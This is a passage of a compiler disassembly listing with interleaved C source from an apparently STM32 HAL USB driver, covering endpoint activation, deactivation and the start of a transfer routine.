 80065bc:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 80065c0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065c4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065c8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80065cc:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80065d0:	b29b      	uxth	r3, r3
 80065d2:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80065d4:	683b      	ldr	r3, [r7, #0]
 80065d6:	78db      	ldrb	r3, [r3, #3]
 80065d8:	2b01      	cmp	r3, #1
 80065da:	d024      	beq.n	8006626 <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80065dc:	687a      	ldr	r2, [r7, #4]
 80065de:	683b      	ldr	r3, [r7, #0]
 80065e0:	781b      	ldrb	r3, [r3, #0]
 80065e2:	009b      	lsls	r3, r3, #2
 80065e4:	4413      	add	r3, r2
 80065e6:	881b      	ldrh	r3, [r3, #0]
 80065e8:	b29b      	uxth	r3, r3
 80065ea:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065ee:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80065f2:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 80065f6:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 80065fa:	f083 0320 	eor.w	r3, r3, #32
 80065fe:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 8006602:	687a      	ldr	r2, [r7, #4]
 8006604:	683b      	ldr	r3, [r7, #0]
 8006606:	781b      	ldrb	r3, [r3, #0]
 8006608:	009b      	lsls	r3, r3, #2
 800660a:	441a      	add	r2, r3
 800660c:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 8006610:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006614:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006618:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800661c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006620:	b29b      	uxth	r3, r3
 8006622:	8013      	strh	r3, [r2, #0]
 8006624:	e01d      	b.n	8006662 <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006626:	687a      	ldr	r2, [r7, #4]
 8006628:	683b      	ldr	r3, [r7, #0]
 800662a:	781b      	ldrb	r3, [r3, #0]
 800662c:	009b      	lsls	r3, r3, #2
 800662e:	4413      	add	r3, r2
 8006630:	881b      	ldrh	r3, [r3, #0]
 8006632:	b29b      	uxth	r3, r3
 8006634:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006638:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800663c:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 8006640:	687a      	ldr	r2, [r7, #4]
 8006642:	683b      	ldr	r3, [r7, #0]
 8006644:	781b      	ldrb	r3, [r3, #0]
 8006646:	009b      	lsls	r3, r3, #2
 8006648:	441a      	add	r2, r3
 800664a:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 800664e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006652:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006656:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800665a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800665e:	b29b      	uxth	r3, r3
 8006660:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006662:	687a      	ldr	r2, [r7, #4]
 8006664:	683b      	ldr	r3, [r7, #0]
 8006666:	781b      	ldrb	r3, [r3, #0]
 8006668:	009b      	lsls	r3, r3, #2
 800666a:	4413      	add	r3, r2
 800666c:	881b      	ldrh	r3, [r3, #0]
 800666e:	b29b      	uxth	r3, r3
 8006670:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006674:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006678:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 800667c:	687a      	ldr	r2, [r7, #4]
 800667e:	683b      	ldr	r3, [r7, #0]
 8006680:	781b      	ldrb	r3, [r3, #0]
 8006682:	009b      	lsls	r3, r3, #2
 8006684:	441a      	add	r2, r3
 8006686:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 800668a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800668e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006692:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006696:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800669a:	b29b      	uxth	r3, r3
 800669c:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 800669e:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 80066a2:	4618      	mov	r0, r3
 80066a4:	3774      	adds	r7, #116	; 0x74
 80066a6:	46bd      	mov	sp, r7
 80066a8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80066ac:	4770      	bx	lr
 80066ae:	bf00      	nop

080066b0 <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80066b0:	b480      	push	{r7}
 80066b2:	b08d      	sub	sp, #52	; 0x34
 80066b4:	af00      	add	r7, sp, #0
 80066b6:	6078      	str	r0, [r7, #4]
 80066b8:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 80066ba:	683b      	ldr	r3, [r7, #0]
 80066bc:	7b1b      	ldrb	r3, [r3, #12]
 80066be:	2b00      	cmp	r3, #0
 80066c0:	f040 808e 	bne.w	80067e0 <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 80066c4:	683b      	ldr	r3, [r7, #0]
 80066c6:	785b      	ldrb	r3, [r3, #1]
 80066c8:	2b00      	cmp	r3, #0
 80066ca:	d044      	beq.n	8006756 <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80066cc:	687a      	ldr	r2, [r7, #4]
 80066ce:	683b      	ldr	r3, [r7, #0]
 80066d0:	781b      	ldrb	r3, [r3, #0]
 80066d2:	009b      	lsls	r3, r3, #2
 80066d4:	4413      	add	r3, r2
 80066d6:	881b      	ldrh	r3, [r3, #0]
 80066d8:	81bb      	strh	r3, [r7, #12]
 80066da:	89bb      	ldrh	r3, [r7, #12]
 80066dc:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80066e0:	2b00      	cmp	r3, #0
 80066e2:	d01b      	beq.n	800671c <USB_DeactivateEndpoint+0x6c>
 80066e4:	687a      	ldr	r2, [r7, #4]
 80066e6:	683b      	ldr	r3, [r7, #0]
 80066e8:	781b      	ldrb	r3, [r3, #0]
 80066ea:	009b      	lsls	r3, r3, #2
 80066ec:	4413      	add	r3, r2
 80066ee:	881b      	ldrh	r3, [r3, #0]
 80066f0:	b29b      	uxth	r3, r3
 80066f2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066f6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80066fa:	817b      	strh	r3, [r7, #10]
 80066fc:	687a      	ldr	r2, [r7, #4]
 80066fe:	683b      	ldr	r3, [r7, #0]
 8006700:	781b      	ldrb	r3, [r3, #0]
 8006702:	009b      	lsls	r3, r3, #2
 8006704:	441a      	add	r2, r3
 8006706:	897b      	ldrh	r3, [r7, #10]
 8006708:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800670c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006710:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006714:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006718:	b29b      	uxth	r3, r3
 800671a:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800671c:	687a      	ldr	r2, [r7, #4]
 800671e:	683b      	ldr	r3, [r7, #0]
 8006720:	781b      	ldrb	r3, [r3, #0]
 8006722:	009b      	lsls	r3, r3, #2
 8006724:	4413      	add	r3, r2
 8006726:	881b      	ldrh	r3, [r3, #0]
 8006728:	b29b      	uxth	r3, r3
 800672a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800672e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006732:	813b      	strh	r3, [r7, #8]
 8006734:	687a      	ldr	r2, [r7, #4]
 8006736:	683b      	ldr	r3, [r7, #0]
 8006738:	781b      	ldrb	r3, [r3, #0]
 800673a:	009b      	lsls	r3, r3, #2
 800673c:	441a      	add	r2, r3
 800673e:	893b      	ldrh	r3, [r7, #8]
 8006740:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006744:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006748:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800674c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006750:	b29b      	uxth	r3, r3
 8006752:	8013      	strh	r3, [r2, #0]
 8006754:	e192      	b.n	8006a7c <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006756:	687a      	ldr	r2, [r7, #4]
 8006758:	683b      	ldr	r3, [r7, #0]
 800675a:	781b      	ldrb	r3, [r3, #0]
 800675c:	009b      	lsls	r3, r3, #2
 800675e:	4413      	add	r3, r2
 8006760:	881b      	ldrh	r3, [r3, #0]
 8006762:	827b      	strh	r3, [r7, #18]
 8006764:	8a7b      	ldrh	r3, [r7, #18]
 8006766:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800676a:	2b00      	cmp	r3, #0
 800676c:	d01b      	beq.n	80067a6 <USB_DeactivateEndpoint+0xf6>
 800676e:	687a      	ldr	r2, [r7, #4]
 8006770:	683b      	ldr	r3, [r7, #0]
 8006772:	781b      	ldrb	r3, [r3, #0]
 8006774:	009b      	lsls	r3, r3, #2
 8006776:	4413      	add	r3, r2
 8006778:	881b      	ldrh	r3, [r3, #0]
 800677a:	b29b      	uxth	r3, r3
 800677c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006780:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006784:	823b      	strh	r3, [r7, #16]
 8006786:	687a      	ldr	r2, [r7, #4]
 8006788:	683b      	ldr	r3, [r7, #0]
 800678a:	781b      	ldrb	r3, [r3, #0]
 800678c:	009b      	lsls	r3, r3, #2
 800678e:	441a      	add	r2, r3
 8006790:	8a3b      	ldrh	r3, [r7, #16]
 8006792:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006796:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800679a:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800679e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067a2:	b29b      	uxth	r3, r3
 80067a4:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80067a6:	687a      	ldr	r2, [r7, #4]
 80067a8:	683b      	ldr	r3, [r7, #0]
 80067aa:	781b      	ldrb	r3, [r3, #0]
 80067ac:	009b      	lsls	r3, r3, #2
 80067ae:	4413      	add	r3, r2
 80067b0:	881b      	ldrh	r3, [r3, #0]
 80067b2:	b29b      	uxth	r3, r3
 80067b4:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80067b8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067bc:	81fb      	strh	r3, [r7, #14]
 80067be:	687a      	ldr	r2, [r7, #4]
 80067c0:	683b      	ldr	r3, [r7, #0]
 80067c2:	781b      	ldrb	r3, [r3, #0]
 80067c4:	009b      	lsls	r3, r3, #2
 80067c6:	441a      	add	r2, r3
 80067c8:	89fb      	ldrh	r3, [r7, #14]
 80067ca:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067ce:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067d2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067d6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067da:	b29b      	uxth	r3, r3
 80067dc:	8013      	strh	r3, [r2, #0]
 80067de:	e14d      	b.n	8006a7c <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 80067e0:	683b      	ldr	r3, [r7, #0]
 80067e2:	785b      	ldrb	r3, [r3, #1]
 80067e4:	2b00      	cmp	r3, #0
 80067e6:	f040 80a5 	bne.w	8006934 <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80067ea:	687a      	ldr	r2, [r7, #4]
 80067ec:	683b      	ldr	r3, [r7, #0]
 80067ee:	781b      	ldrb	r3, [r3, #0]
 80067f0:	009b      	lsls	r3, r3, #2
 80067f2:	4413      	add	r3, r2
 80067f4:	881b      	ldrh	r3, [r3, #0]
 80067f6:	843b      	strh	r3, [r7, #32]
 80067f8:	8c3b      	ldrh	r3, [r7, #32]
 80067fa:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80067fe:	2b00      	cmp	r3, #0
 8006800:	d01b      	beq.n	800683a <USB_DeactivateEndpoint+0x18a>
 8006802:	687a      	ldr	r2, [r7, #4]
 8006804:	683b      	ldr	r3, [r7, #0]
 8006806:	781b      	ldrb	r3, [r3, #0]
 8006808:	009b      	lsls	r3, r3, #2
 800680a:	4413      	add	r3, r2
 800680c:	881b      	ldrh	r3, [r3, #0]
 800680e:	b29b      	uxth	r3, r3
 8006810:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006814:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006818:	83fb      	strh	r3, [r7, #30]
 800681a:	687a      	ldr	r2, [r7, #4]
 800681c:	683b      	ldr	r3, [r7, #0]
 800681e:	781b      	ldrb	r3, [r3, #0]
 8006820:	009b      	lsls	r3, r3, #2
 8006822:	441a      	add	r2, r3
 8006824:	8bfb      	ldrh	r3, [r7, #30]
 8006826:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800682a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800682e:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006832:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006836:	b29b      	uxth	r3, r3
 8006838:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800683a:	687a      	ldr	r2, [r7, #4]
 800683c:	683b      	ldr	r3, [r7, #0]
 800683e:	781b      	ldrb	r3, [r3, #0]
 8006840:	009b      	lsls	r3, r3, #2
 8006842:	4413      	add	r3, r2
 8006844:	881b      	ldrh	r3, [r3, #0]
 8006846:	83bb      	strh	r3, [r7, #28]
 8006848:	8bbb      	ldrh	r3, [r7, #28]
 800684a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800684e:	2b00      	cmp	r3, #0
 8006850:	d01b      	beq.n	800688a <USB_DeactivateEndpoint+0x1da>
 8006852:	687a      	ldr	r2, [r7, #4]
 8006854:	683b      	ldr	r3, [r7, #0]
 8006856:	781b      	ldrb	r3, [r3, #0]
 8006858:	009b      	lsls	r3, r3, #2
 800685a:	4413      	add	r3, r2
 800685c:	881b      	ldrh	r3, [r3, #0]
 800685e:	b29b      	uxth	r3, r3
 8006860:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006864:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006868:	837b      	strh	r3, [r7, #26]
 800686a:	687a      	ldr	r2, [r7, #4]
 800686c:	683b      	ldr	r3, [r7, #0]
 800686e:	781b      	ldrb	r3, [r3, #0]
 8006870:	009b      	lsls	r3, r3, #2
 8006872:	441a      	add	r2, r3
 8006874:	8b7b      	ldrh	r3, [r7, #26]
 8006876:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800687a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800687e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006882:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006886:	b29b      	uxth	r3, r3
 8006888:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 800688a:	687a      	ldr	r2, [r7, #4]
 800688c:	683b      	ldr	r3, [r7, #0]
 800688e:	781b      	ldrb	r3, [r3, #0]
 8006890:	009b      	lsls	r3, r3, #2
 8006892:	4413      	add	r3, r2
 8006894:	881b      	ldrh	r3, [r3, #0]
 8006896:	b29b      	uxth	r3, r3
 8006898:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800689c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068a0:	833b      	strh	r3, [r7, #24]
 80068a2:	687a      	ldr	r2, [r7, #4]
 80068a4:	683b      	ldr	r3, [r7, #0]
 80068a6:	781b      	ldrb	r3, [r3, #0]
 80068a8:	009b      	lsls	r3, r3, #2
 80068aa:	441a      	add	r2, r3
 80068ac:	8b3b      	ldrh	r3, [r7, #24]
 80068ae:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068b2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068b6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068ba:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80068be:	b29b      	uxth	r3, r3
 80068c0:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80068c2:	687a      	ldr	r2, [r7, #4]
 80068c4:	683b      	ldr	r3, [r7, #0]
 80068c6:	781b      	ldrb	r3, [r3, #0]
 80068c8:	009b      	lsls	r3, r3, #2
 80068ca:	4413      	add	r3, r2
 80068cc:	881b      	ldrh	r3, [r3, #0]
 80068ce:	b29b      	uxth	r3, r3
 80068d0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80068d4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068d8:	82fb      	strh	r3, [r7, #22]
 80068da:	687a      	ldr	r2, [r7, #4]
 80068dc:	683b      	ldr	r3, [r7, #0]
 80068de:	781b      	ldrb	r3, [r3, #0]
 80068e0:	009b      	lsls	r3, r3, #2
 80068e2:	441a      	add	r2, r3
 80068e4:	8afb      	ldrh	r3, [r7, #22]
 80068e6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068ea:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068ee:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068f2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068f6:	b29b      	uxth	r3, r3
 80068f8:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80068fa:	687a      	ldr	r2, [r7, #4]
 80068fc:	683b      	ldr	r3, [r7, #0]
 80068fe:	781b      	ldrb	r3, [r3, #0]
 8006900:	009b      	lsls	r3, r3, #2
 8006902:	4413      	add	r3, r2
 8006904:	881b      	ldrh	r3, [r3, #0]
 8006906:	b29b      	uxth	r3, r3
 8006908:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800690c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006910:	82bb      	strh	r3, [r7, #20]
 8006912:	687a      	ldr	r2, [r7, #4]
 8006914:	683b      	ldr	r3, [r7, #0]
 8006916:	781b      	ldrb	r3, [r3, #0]
 8006918:	009b      	lsls	r3, r3, #2
 800691a:	441a      	add	r2, r3
 800691c:	8abb      	ldrh	r3, [r7, #20]
 800691e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006922:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006926:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800692a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800692e:	b29b      	uxth	r3, r3
 8006930:	8013      	strh	r3, [r2, #0]
 8006932:	e0a3      	b.n	8006a7c <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006934:	687a      	ldr	r2, [r7, #4]
 8006936:	683b      	ldr	r3, [r7, #0]
 8006938:	781b      	ldrb	r3, [r3, #0]
 800693a:	009b      	lsls	r3, r3, #2
 800693c:	4413      	add	r3, r2
 800693e:	881b      	ldrh	r3, [r3, #0]
 8006940:	85fb      	strh	r3, [r7, #46]	; 0x2e
 8006942:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 8006944:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006948:	2b00      	cmp	r3, #0
 800694a:	d01b      	beq.n	8006984 <USB_DeactivateEndpoint+0x2d4>
 800694c:	687a      	ldr	r2, [r7, #4]
 800694e:	683b      	ldr	r3, [r7, #0]
 8006950:	781b      	ldrb	r3, [r3, #0]
 8006952:	009b      	lsls	r3, r3, #2
 8006954:	4413      	add	r3, r2
 8006956:	881b      	ldrh	r3, [r3, #0]
 8006958:	b29b      	uxth	r3, r3
 800695a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800695e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006962:	85bb      	strh	r3, [r7, #44]	; 0x2c
 8006964:	687a      	ldr	r2, [r7, #4]
 8006966:	683b      	ldr	r3, [r7, #0]
 8006968:	781b      	ldrb	r3, [r3, #0]
 800696a:	009b      	lsls	r3, r3, #2
 800696c:	441a      	add	r2, r3
 800696e:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 8006970:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006974:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006978:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800697c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006980:	b29b      	uxth	r3, r3
 8006982:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006984:	687a      	ldr	r2, [r7, #4]
 8006986:	683b      	ldr	r3, [r7, #0]
 8006988:	781b      	ldrb	r3, [r3, #0]
 800698a:	009b      	lsls	r3, r3, #2
 800698c:	4413      	add	r3, r2
 800698e:	881b      	ldrh	r3, [r3, #0]
 8006990:	857b      	strh	r3, [r7, #42]	; 0x2a
 8006992:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006994:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006998:	2b00      	cmp	r3, #0
 800699a:	d01b      	beq.n	80069d4 <USB_DeactivateEndpoint+0x324>
 800699c:	687a      	ldr	r2, [r7, #4]
 800699e:	683b      	ldr	r3, [r7, #0]
 80069a0:	781b      	ldrb	r3, [r3, #0]
 80069a2:	009b      	lsls	r3, r3, #2
 80069a4:	4413      	add	r3, r2
 80069a6:	881b      	ldrh	r3, [r3, #0]
 80069a8:	b29b      	uxth	r3, r3
 80069aa:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069ae:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069b2:	853b      	strh	r3, [r7, #40]	; 0x28
 80069b4:	687a      	ldr	r2, [r7, #4]
 80069b6:	683b      	ldr	r3, [r7, #0]
 80069b8:	781b      	ldrb	r3, [r3, #0]
 80069ba:	009b      	lsls	r3, r3, #2
 80069bc:	441a      	add	r2, r3
 80069be:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 80069c0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069c4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069c8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069cc:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80069d0:	b29b      	uxth	r3, r3
 80069d2:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 80069d4:	687a      	ldr	r2, [r7, #4]
 80069d6:	683b      	ldr	r3, [r7, #0]
 80069d8:	781b      	ldrb	r3, [r3, #0]
 80069da:	009b      	lsls	r3, r3, #2
 80069dc:	4413      	add	r3, r2
 80069de:	881b      	ldrh	r3, [r3, #0]
 80069e0:	b29b      	uxth	r3, r3
 80069e2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069e6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069ea:	84fb      	strh	r3, [r7, #38]	; 0x26
 80069ec:	687a      	ldr	r2, [r7, #4]
 80069ee:	683b      	ldr	r3, [r7, #0]
 80069f0:	781b      	ldrb	r3, [r3, #0]
 80069f2:	009b      	lsls	r3, r3, #2
 80069f4:	441a      	add	r2, r3
 80069f6:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 80069f8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069fc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a00:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006a04:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a08:	b29b      	uxth	r3, r3
 8006a0a:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006a0c:	687a      	ldr	r2, [r7, #4]
 8006a0e:	683b      	ldr	r3, [r7, #0]
 8006a10:	781b      	ldrb	r3, [r3, #0]
 8006a12:	009b      	lsls	r3, r3, #2
 8006a14:	4413      	add	r3, r2
 8006a16:	881b      	ldrh	r3, [r3, #0]
 8006a18:	b29b      	uxth	r3, r3
 8006a1a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a1e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006a22:	84bb      	strh	r3, [r7, #36]	; 0x24
 8006a24:	687a      	ldr	r2, [r7, #4]
 8006a26:	683b      	ldr	r3, [r7, #0]
 8006a28:	781b      	ldrb	r3, [r3, #0]
 8006a2a:	009b      	lsls	r3, r3, #2
 8006a2c:	441a      	add	r2, r3
 8006a2e:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 8006a30:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a34:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a38:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a3c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a40:	b29b      	uxth	r3, r3
 8006a42:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006a44:	687a      	ldr	r2, [r7, #4]
 8006a46:	683b      	ldr	r3, [r7, #0]
 8006a48:	781b      	ldrb	r3, [r3, #0]
 8006a4a:	009b      	lsls	r3, r3, #2
 8006a4c:	4413      	add	r3, r2
 8006a4e:	881b      	ldrh	r3, [r3, #0]
 8006a50:	b29b      	uxth	r3, r3
 8006a52:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006a56:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a5a:	847b      	strh	r3, [r7, #34]	; 0x22
 8006a5c:	687a      	ldr	r2, [r7, #4]
 8006a5e:	683b      	ldr	r3, [r7, #0]
 8006a60:	781b      	ldrb	r3, [r3, #0]
 8006a62:	009b      	lsls	r3, r3, #2
 8006a64:	441a      	add	r2, r3
 8006a66:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006a68:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a6c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a70:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a74:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a78:	b29b      	uxth	r3, r3
 8006a7a:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8006a7c:	2300      	movs	r3, #0
}
 8006a7e:	4618      	mov	r0, r3
 8006a80:	3734      	adds	r7, #52	; 0x34
 8006a82:	46bd      	mov	sp, r7
 8006a84:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006a88:	4770      	bx	lr

08006a8a <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006a8a:	b580      	push	{r7, lr}
 8006a8c:	b0c2      	sub	sp, #264	; 0x108
 8006a8e:	af00      	add	r7, sp, #0
 8006a90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a94:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006a98:	6018      	str	r0, [r3, #0]
